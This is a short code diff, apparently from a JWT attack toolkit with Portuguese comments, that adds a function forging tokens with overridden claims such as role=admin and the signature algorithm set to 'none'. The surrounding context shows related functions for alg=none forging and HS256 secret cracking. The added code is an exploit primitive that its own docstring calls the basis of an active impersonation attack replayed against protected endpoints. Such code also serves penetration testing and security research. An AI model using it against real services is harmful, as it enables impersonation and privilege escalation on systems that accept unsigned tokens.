@@ -65,6 +65,17 @@ def forge_alg_none(token):
     return _signing_input(header, payload) + "."
 
 
+def forge_with_claims(token, overrides, alg="none"):
+    """Reemite o token com claims sobrescritas (ex.: role=admin) e alg=none por padrão —
+    primitiva do ataque ativo de impersonação (replay a endpoint protegido)."""
+    header, payload = decode_jwt(token)
+    header = dict(header)
+    header["alg"] = alg
+    payload = dict(payload)
+    payload.update(overrides or {})
+    return _signing_input(header, payload) + "."
+
+
 def crack_hs256(token, wordlist):
     """Tenta quebrar o segredo HS256 com uma wordlist; retorna o segredo ou None."""
     try:
